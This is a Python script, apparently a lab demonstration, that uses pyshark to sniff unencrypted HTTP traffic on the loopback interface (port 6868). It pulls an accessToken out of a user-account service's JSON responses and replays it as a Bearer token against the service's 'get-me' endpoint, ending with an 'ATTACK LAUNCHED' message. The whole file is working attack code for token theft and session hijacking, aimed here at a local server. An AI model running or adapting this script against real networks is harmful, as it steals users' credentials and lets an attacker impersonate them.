import pyshark
import json
import requests

USER_ACC_MGMT_SERV_ADDR = "http://127.0.0.1:6868/"
GET_ME_ENDPOINT = "get-me"

def capture_packets():
    """
    Capture packets from the server on the loopback interface and extract the accessToken from responses.
    """
    print("Starting packet capture on loopback (127.0.0.1), TCP port 6868...")
    
    # Set up a live capture on the loopback interface
    capture = pyshark.LiveCapture(
        interface='lo',  # Use 'lo0' for Mac if needed
        bpf_filter='tcp port 6868'  # Capture only TCP traffic on port 6868
    )
    
    for packet in capture.sniff_continuously():  # Capture packets indefinitely
        try:
            # Check if the packet contains HTTP layer
            if 'HTTP' in packet:
                http_layer = packet.http

                # Check if the HTTP packet is a response (e.g., has a JSON payload)
                if hasattr(http_layer, 'file_data'):  # file_data contains the HTTP body
                    http_payload = http_layer.file_data
                    
                    # Attempt to parse the payload as JSON
                    try:
                        response_data = json.loads(http_payload)
                        if 'data' in response_data and 'accessToken' in response_data['data']:
                            access_token = response_data['data']['accessToken']
                            print(f"Access Token Captured: {access_token}")
                            return access_token  # Exit after capturing the first token
                    except json.JSONDecodeError:
                        print("Failed to decode JSON from packet payload.")

        except AttributeError:
            # Ignore packets without HTTP or malformed data
            continue

def make_request_with_token(token):
    """
    Use the extracted token to make a request to the server.
    """
    url = USER_ACC_MGMT_SERV_ADDR + GET_ME_ENDPOINT
    headers = {"Authorization": f"Bearer {token}"}

    print(f"Making a request to {url} with token...")
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        print("Server Response: ", response.json())
    else:
        print(f"Failed to retrieve data. Status Code: {response.status_code}, Response: {response.text}")

if __name__ == "__main__":
    # Step 1: Capture packets and extract the access token
    token = capture_packets()

    if token:
        # Step 2: Use the token to make a request to the server
        make_request_with_token(token)
        print("System intercepted ----------- ATTACK LAUNCHED")
    else:
        print("No token captured.")
